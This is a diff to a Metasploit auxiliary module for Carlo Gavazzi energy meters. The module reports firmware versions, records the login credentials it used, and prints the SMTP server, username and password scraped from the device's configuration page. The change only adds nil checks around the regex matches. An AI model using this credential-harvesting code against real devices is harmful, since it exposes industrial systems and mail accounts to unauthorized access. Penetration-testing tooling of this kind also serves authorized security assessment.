@@ -162,15 +162,18 @@ class MetasploitModule < Msf::Auxiliary
 
         if !fw_ver_dirty.nil?
           fw_ver_clean = "#{fw_ver_dirty}".match(/Ver. (.*)[$<]/)[1]
-          print_good("#{rhost}:#{rport} - Firmware version #{fw_ver_clean}...")
 
-          report_cred(
-            ip: rhost,
-            port: rport,
-            service_name: "Carlo Gavazzi Energy Meter [Firmware ver #{fw_ver_clean}]",
-            user: user,
-            password: pass
-          )
+          if !fw_ver_clean.nil?
+            print_good("#{rhost}:#{rport} - Firmware version #{fw_ver_clean}...")
+
+            report_cred(
+              ip: rhost,
+              port: rport,
+              service_name: "Carlo Gavazzi Energy Meter [Firmware ver #{fw_ver_clean}]",
+              user: user,
+              password: pass
+            )
+          end
         end
       end
 
@@ -179,15 +182,18 @@ class MetasploitModule < Msf::Auxiliary
 
         if !fw_ver_dirty.nil?
           fw_ver_clean = "#{fw_ver_dirty}".match(/[^Ver. ](.*)[^<]/)
-          print_good("#{rhost}:#{rport} - Firmware version #{fw_ver_clean}...")
 
-          report_cred(
-            ip: rhost,
-            port: rport,
-            service_name: "Carlo Gavazzi Energy Meter [Firmware ver #{fw_ver_clean}]",
-            user: user,
-            password: pass
-          )
+          if !fw_ver_clean.nil?
+            print_good("#{rhost}:#{rport} - Firmware version #{fw_ver_clean}...")
+
+            report_cred(
+              ip: rhost,
+              port: rport,
+              service_name: "Carlo Gavazzi Energy Meter [Firmware ver #{fw_ver_clean}]",
+              user: user,
+              password: pass
+            )
+          end
         end
       end
 
@@ -213,14 +219,17 @@ class MetasploitModule < Msf::Auxiliary
 
       if (res && res.code == 200 && res.body.include?('SMTP'))
         dirty_smtp_server = res.body.match(/smtp" value=(.*)[$=]/)[1]
-        smtp_server = dirty_smtp_server.match(/[$"](.*)[$"]/)
         dirty_smtp_user = res.body.match(/usersmtp" value=(.*)[$=]/)[1]
-        smtp_user = dirty_smtp_user.match(/[$"](.*)[$"]/)
         dirty_smtp_pass = res.body.match(/passwordsmtp" value=(.*)[$=]/)[1]
-        smtp_pass = dirty_smtp_pass.match(/[$"](.*)[$"]/)
 
         if (!dirty_smtp_server.nil?) && (!dirty_smtp_user.nil?) && (!dirty_smtp_pass.nil?)
-          print_good("#{rhost}:#{rport} - SMTP server: #{smtp_server}, SMTP username: #{smtp_user}, SMTP password: #{smtp_pass}")
+          smtp_server = dirty_smtp_server.match(/[$"](.*)[$"]/)
+          smtp_user = dirty_smtp_user.match(/[$"](.*)[$"]/)
+          smtp_pass = dirty_smtp_pass.match(/[$"](.*)[$"]/)
+
+          if (!smtp_server.nil?) && (!smtp_user.nil?) && (!smtp_pass.nil?)
+            print_good("#{rhost}:#{rport} - SMTP server: #{smtp_server}, SMTP username: #{smtp_user}, SMTP password: #{smtp_pass}")
+          end
         end
       else
         vprint_error("#{rhost}:#{rport} - SMTP config could not be retrieved. Check if the user has administrative privileges")
